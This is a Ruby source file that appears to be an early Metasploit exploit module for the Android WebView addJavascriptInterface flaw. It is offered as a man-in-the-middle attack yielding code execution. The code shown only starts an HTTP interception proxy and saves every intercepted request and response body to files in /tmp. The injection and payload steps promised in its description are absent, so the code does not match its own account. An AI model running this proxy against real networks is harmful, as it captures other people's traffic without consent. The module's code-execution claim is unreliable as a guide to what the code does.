##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'thread'
require 'msf/core'
require 'rex/proto/proxy/http'

class Metasploit3 < Msf::Exploit::Remote

  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Android WebView addJavascriptInterface MITM Code Execution',
      'Description' => %q{
              This module exploits an issue where MITM attackers can execute 
          arbitrary code on vulnerable Android devices. The issue is rooted in
          the use of the addJavascriptInterface function, which exposes Java
          Reflection to Javascript executing within an affected WebView. By 
          injecting Javascript into the stream, this module uploads and 
          executes an automatically generated payload executable.

          This module relies on the Rex::Proto::Proxy::Http class to function.
      },
      'License'     => MSF_LICENSE,
      'Author'      => [ 'jduck' ],
      'References'     =>
        [
          # None assigned yet?
          # ['CVE', '2013-'],
          # ['OSVDB', ''],
          # ['BID', ''],
          ['URL', 'https://labs.mwrinfosecurity.com/blog/2012/04/23/adventures-with-android-webviews/'],
          ['URL', 'http://50.56.33.56/blog/?p=314'],
          ['URL', 'https://labs.mwrinfosecurity.com/advisories/2013/09/24/webview-addjavascriptinterface-remote-code-execution/']
        ],
      'Platform'       => 'linux',
      'Arch'           => ARCH_ARMLE,
      'Stance'         => Msf::Exploit::Stance::Passive,
      'DefaultOptions' =>
        {
          'PrependFork' => true
        },
      'Targets'        =>
        [
          [ 'Automatic', {}],
        ],
      'DisclosureDate' => 'Dec 21 2012',
      'DefaultTarget'  => 0))

    register_options(
      [
        OptString.new( 'SRVHOST', [ true,  "The address to listen on", '0.0.0.0' ] ),
        OptPort.new('SRVPORT', [ true, "The daemon port to listen on", 8080 ]),
      ], self.class)
  end

  def setup
    super
    @mutex = ::Mutex.new
    @hproxy = nil
  end

  def cleanup
    @mutex.synchronize do
      if( @hproxy )
        print_status( "Stopping the HTTP proxy server" )
        @hproxy.stop
        @hproxy = nil
      end
    end
    super
  end

  def on_http_request(cli, req)
    # we dont muck with requests...
    File.write('/tmp/request'+Time.new.to_i.to_s, req.body)
  end

  def on_http_response(cli, res)
    File.write('/tmp/response'+Time.new.to_i.to_s, res.body)
  end

  def exploit
    opts = {
      'ServerHost' => datastore['SRVHOST'],
      'ServerPort' => datastore['SRVPORT'],
      'Context' => {'Msf' => framework, 'MsfExploit' => self}
    }

    @hproxy = Rex::Proto::Proxy::Http.new(
      datastore['SRVPORT'],
      datastore['SRVHOST'],
      false,
      datastore['Context'])

    print_status("Starting the HTTP proxy server")

    @hproxy.on_http_request_proc = Proc.new { |cli, req|
      on_http_request(cli, req)
    }
    @hproxy.on_http_response_proc = Proc.new { |cli, res|
      on_http_response(cli, res)
    }

    @hproxy.start
    @hproxy.wait
  end

end
